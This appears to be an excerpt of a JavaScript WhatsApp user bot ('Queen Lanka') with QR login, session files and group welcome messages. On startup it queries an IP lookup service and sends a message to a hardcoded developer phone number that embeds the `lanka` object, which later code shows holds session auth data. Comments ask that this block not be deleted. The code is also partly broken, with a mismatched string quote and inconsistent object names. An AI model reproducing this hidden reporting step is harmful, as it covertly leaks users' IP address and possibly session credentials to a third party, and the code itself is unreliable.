...
//ngak penting tapi jangan lu hapus
    const banner=cfonts["render"](("Queen          Lanka"),{font:"block",color:"white",align:"center",gradient:["red","yellow"],lineHeight:2})
...
//  ngak penting tapi jangan lu hapus
    ...
    hyper.browserDescription = ["Queen Lanka", "BMW(VIP)", "3.0"];

    hyper.on('qr', () => {
        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr, bro, make WhatsApp 👍 '))
    })
    console.log()
    fs.existsSync('./qr session key.json') && hyper.loadAuthInfo('./qr session key.json')
    console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       hyper.sendMessage("94702256963@s.whatsapp.net", `─────「 LANLA-USER 」─────\n\n\`\`\`${lanka}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Lanka bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/chamod.jpg'),sourceUrl:"https://wa.me/94702256963?text=welcome"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
    hyper.on('connecting', () => {
    console.log()
        start('2', '♻️ WAITING CONNECT TO THE WHATSAPP')
    })
    hyper.on('open', () => {
    success('2', 'Connected')
    setTimeout( () => {
          console.log()
      	  console.log(color('♻️ QUEEN LANKA USER BOT IS NOW WORKING ♻️`, 'red'))
      	    	}, 1000)    		    	     	
    }) 
    ...
    await hyper.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./qr session api.json', JSON.stringify(lanka.base64EncodedAuthInfo(), null, '\t'))
...
const imageToBase64 = require('image-to-base64')
       ...
       buff = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/welcome?name=${anu_user}&picurl=${imge}&namegrp=${encodeURI(mdata.subject)}&imggrp=${ime}&member=@${anu_user}&picbg=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTk_nUY-WcxLBvTRJPNBUKhqWA6LdZCmZG75A&usqp=CAU`);
        ...
        buttons = [
          { buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 3 },
                    { buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 3 },
                     { buttonId: `g`, buttonText: { displayText: "ගැහැනු/පිරිමි" }, type: 3 },
        ];         
        imageMsg = (
      ...
      if (anu.action == "remove" && !mem.includes(hyper.user.jid)) {
        ...
        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
        memeg = mdata.participants.length;
        out = `Why is that? how come out? \nගියා නේහ...කමක්නෑ තරහක් නෑ මට ${anu_user} we will miss you`;
    ...
    remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "lankabot", "caption": `Creator Botwea © 2K21`, 'jpegThumbnail': fs.readFileSync(`image/${setting.thumb}`)}}}    	
